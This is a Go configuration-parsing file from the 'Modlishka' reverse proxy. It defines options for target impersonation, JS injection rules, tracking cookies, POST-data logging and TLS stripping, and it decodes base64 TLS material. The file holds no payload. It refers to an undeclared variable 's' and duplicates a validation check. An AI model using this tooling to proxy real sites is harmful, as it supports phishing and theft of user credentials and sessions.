/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package config

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"github.com/XdaemonX/Modlishka/log"
	"io/ioutil"
	"os"
)

type Options struct {
	ProxyDomain          *string `json:"proxyDomain"`
	ListeningAddress     *string `json:"listeningAddress"`
	ListeningPortHTTP    *int    `json:"listeningPortHTTP"`
	ListeningPortHTTPS   *int    `json:"listeningPortHTTPS"`
	ProxyAddress     	 *string `json:"proxyAddress"`
	Target               *string `json:"target"`
	TargetRes            *string `json:"targetResources"`
	TargetRules          *string `json:"rules"`
	JsRules              *string `json:"jsRules"`
	TerminateTriggers    *string `json:"terminateTriggers"`
	TerminateRedirectUrl *string `json:"terminateRedirectUrl"`
	TrackingCookie       *string `json:"trackingCookie"`
	TrackingParam        *string `json:"trackingParam"`
	Debug                *bool   `json:"debug"`
	ForceHTTPS           *bool   `json:"forceHTTPS"`
	ForceHTTP            *bool   `json:"forceHTTP"`
	LogPostOnly          *bool   `json:"logPostOnly"`
	DisableSecurity      *bool   `json:"disableSecurity"`
	DynamicMode          *bool   `json:"dynamicMode"`
	LogRequestFile       *string `json:"log"`
	Plugins              *string `json:"plugins"`
	*TLSConfig
}

type TLSConfig struct {
	TLSCertificate *string `json:"cert"`
	TLSKey         *string `json:"certKey"`
	TLSPool        *string `json:"certPool"`
}

var C = Options{}

func ParseConfiguration(jsonFile string) Options {

	C.parseJSON(jsonFile)

	// Process TLS configuration
	C.TLSConfig = &s

	// we can assume that if someone specified one of the following cmd line parameters then he should define all of them.
	if len(*s.TLSCertificate) > 0 || len(*s.TLSKey) > 0 || len(*s.TLSPool) > 0 {

		// Handle TLS Certificates
		if *C.ForceHTTP == false {
			if len(*C.TLSCertificate) > 0 {
				decodedCertificate, err := base64.StdEncoding.DecodeString(*C.TLSCertificate)
				if err == nil {
					*C.TLSCertificate = string(decodedCertificate)

				}
			}

			if len(*C.TLSKey) > 0 {
				decodedCertificateKey, err := base64.StdEncoding.DecodeString(*C.TLSKey)
				if err == nil {
					*C.TLSKey = string(decodedCertificateKey)
				}
			}

			if len(*C.TLSPool) > 0 {
				decodedCertificatePool, err := base64.StdEncoding.DecodeString(*C.TLSPool)
				if err == nil {
					*C.TLSPool = string(decodedCertificatePool)
				}
			}
		}

	}

	log.Infof("Modlishka parsed configuration\n")


	return C
}

func (c *Options) parseJSON(file string) {

	ct, err := os.Open(file)
	defer ct.Close()
	if err != nil {
		log.Fatalf("Error opening JSON configuration (%s): %s . Terminating.", file, err)
	}

	ctb, _ := ioutil.ReadAll(ct)
	err = json.Unmarshal(ctb, &c)
	if err != nil {
		log.Fatalf("Error unmarshalling JSON configuration (%s): %s . Terminating.", file, err)
	}

	err = json.Unmarshal(ctb, &s)
	if err != nil {
		log.Fatalf("Error unmarshalling JSON configuration (%s): %s . Terminating.", file, err)
	}

	C.TLSConfig = &s

}

func (c *Options) VerifyConfiguration() {

	if *c.ForceHTTP == true {
		if len(*c.ProxyDomain) == 0 || len(*c.ProxyDomain) == 0 {
			log.Warningf("Missing required parameters in oder start the proxy. Terminating.")
			log.Warningf("TIP: You will need to specify at least the following parameters to serve the page over HTTP: proxyDomain and target.")
			flag.PrintDefaults()
			os.Exit(1)
		}
	} else { 	// default + HTTPS wrapper

			if len(*c.ProxyDomain) == 0 || len(*c.ProxyDomain) == 0 {
				log.Warningf("Missing required parameters in oder start the proxy. Terminating.")
				log.Warningf("TIP: You will need to specify at least the following parameters to serve the page over HTTP: proxyDomain and target.")
				flag.PrintDefaults()
				os.Exit(1)
			}


	}


	if *c.DynamicMode == true {
		log.Warningf("Dynamic Mode enabled: Proxy will accept and hook all incoming HTTP requests.")
	}


	if *c.ForceHTTP == true {
		log.Warningf("Force HTTP wrapper enabled: Proxy will strip all TLS traffic and handle requests over HTTP only")
	}

	if *c.ForceHTTPS == true {
		log.Warningf("Force HTTPS wrapper enabled: Proxy will strip all clear-text traffic and handle requests over HTTPS only")
	}

}
